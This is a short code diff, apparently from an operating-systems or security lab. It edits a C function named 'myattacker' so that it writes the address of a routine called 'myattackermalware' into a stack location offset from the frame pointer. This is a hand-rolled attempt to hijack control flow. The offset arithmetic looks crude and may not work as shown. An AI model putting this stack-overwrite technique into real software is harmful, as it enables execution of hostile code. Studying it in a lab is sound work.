@@ -17,7 +17,8 @@ void myattacker()
 	asm("movl %esp,esp;"); //get the esp and ebp into the global vars
 	asm("movl %ebp,ebp;");
 	top_esp = esp;
-	top_ebp = ebp;
+	top_ebp = ebp+505;
+	*top_ebp = &myattackermalware;
 	// top_esp = esp; //and set local vars to the global ones
 	// top_ebp = ebp;
 	kprintf(" ebp: 0x%08X\n", top_ebp);
